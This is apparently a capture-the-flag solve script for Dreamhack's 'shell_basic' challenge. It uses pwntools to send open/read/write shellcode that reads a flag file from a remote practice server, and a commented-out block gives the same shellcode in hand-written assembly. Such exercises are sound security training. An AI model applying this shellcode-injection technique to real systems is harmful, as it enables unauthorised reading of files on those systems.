#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 22307
HOST = "host8.dreamhack.games"
# exe = context.binary = ELF('./filebin', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# sc = asm('''
# 	push 0x0
# 	mov rax, 0x676E6F6F6F6F6F6F
#     push rax
#     mov rax, 0x6C5F73695F656D61 
#     push rax
#     mov rax, 0x6E5F67616C662F63
#     push rax
#     mov rax, 0x697361625f6c6c65
#     push rax
#     mov rax, 0x68732f656d6f682f
#     push rax
#     mov rdi, rsp    
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 2 
#     syscall 

#     mov rdi, rax  
#     mov rsi, rsp
#     sub rsi, 0x30
#     mov rdx, 0x30 
#     mov rax, 0
#     syscall      

#     mov rdi, 1
#     mov rsi, rsp
#     mov rdx, 0x30
#     mov rax, 1
#     syscall                   
# 	''', arch = 'amd64')
context.arch = "amd64"
path = "/home/shell_basic/flag_name_is_loooooong"

sc = shellcraft.open(path)
sc += shellcraft.read("rax", "rsp", 0x30)
sc += shellcraft.write(1, "rsp", 0x30)
sc = asm(sc)

p.sendafter(b"shellcode: ", sc)

p.interactive()

